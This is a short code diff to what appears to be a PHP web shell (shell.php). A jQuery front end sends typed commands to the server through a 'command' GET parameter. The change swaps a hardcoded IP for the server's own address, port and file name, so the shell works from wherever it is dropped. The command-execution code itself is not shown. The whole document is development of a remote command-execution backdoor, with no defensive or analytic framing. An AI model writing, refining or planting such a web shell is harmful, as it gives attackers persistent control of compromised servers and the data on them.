@@ -1,7 +1,10 @@
 <?php
 	error_reporting(E_ALL);
 	
-	$ip = "127.0.0.1";
+	$ip = $_SERVER['SERVER_ADDR'];
+	$port = $_SERVER['SERVER_PORT'];
+	$file = basename(__FILE__); 
+	$connectstr = "http://".$ip.":".$port."/".$file;
 
 	class UserInterface
 	{
@@ -184,7 +187,7 @@ $(document).ready( function() {
 
 	function submit(command) {
 		$.ajax({
-		url: "http://<?php echo $ip; ?>/shell.php",
+		url: "<?php echo $connectstr; ?>",
 			type: "GET",
 			data: {"command": command},
 			success: function(data) {
